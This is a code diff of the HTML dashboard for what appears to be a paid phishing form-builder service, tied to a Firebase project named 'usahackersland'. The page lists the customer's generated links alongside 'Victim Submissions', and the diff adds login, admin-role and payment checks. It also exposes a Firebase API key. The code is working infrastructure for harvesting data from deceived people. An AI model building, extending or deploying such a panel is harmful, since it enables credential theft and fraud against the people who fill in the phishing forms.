@@ -1,4 +1,5 @@
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html>
 <head>
   <title>📋 User Dashboard - Form Builder</title>
   <meta charset="UTF-8">
@@ -66,22 +67,26 @@
   <div class="navbar">
     <h1>📋 Form Builder Dashboard</h1>
     <button onclick="logout()">Logout</button>
-  </div>  <div class="dashboard">
+  </div>  
+  <div class="dashboard">
     <div>
       <a href="index.html" class="button">🛠 Build Form</a>
       <a href="#forms" class="button">🔗 My Links</a>
       <a href="#victims" class="button">👥 View Victims</a>
-    </div><div class="section" id="forms">
-  <h2>🔗 My Created Links</h2>
-  <div id="formsList">Loading forms...</div>
-</div>
+    </div>
 
-<div class="section" id="victims">
-  <h2>👥 Victim Submissions</h2>
-  <div id="victimsList">Loading victims...</div>
-</div>
+    <div class="section" id="forms">
+      <h2>🔗 My Created Links</h2>
+      <div id="formsList">Loading forms...</div>
+    </div>
 
-  </div>  <script>
+    <div class="section" id="victims">
+      <h2>👥 Victim Submissions</h2>
+      <div id="victimsList">Loading victims...</div>
+    </div>
+  </div>  
+
+  <script>
     const firebaseConfig = {
       apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
       authDomain: "usahackersland.firebaseapp.com",
@@ -96,13 +101,35 @@
 
     let currentUserEmail = null;
 
-    auth.onAuthStateChanged(user => {
-      if (user) {
+    auth.onAuthStateChanged(async (user) => {
+      if (!user) {
+        window.location.href = "login.html";
+        return;
+      }
+
+      try {
+        const docSnap = await db.collection("users").doc(user.uid).get();
+        if (!docSnap.exists) {
+          alert("No user record found. Contact support.");
+          return auth.signOut();
+        }
+        const userData = docSnap.data();
+
+        // Role check
+        if (userData.role === "admin") {
+          return window.location.href = "admin.html";
+        }
+
+        // Payment check
+        if (userData.paid === false) {
+          return window.location.href = "payment.html";
+        }
+
         currentUserEmail = user.email;
         loadForms();
         loadVictims();
-      } else {
-        window.location.href = "login.html";
+      } catch (err) {
+        console.error(err);
       }
     });
 
@@ -152,5 +179,6 @@
         });
       });
     }
-  </script></body>
+  </script>
+</body>
 </html>
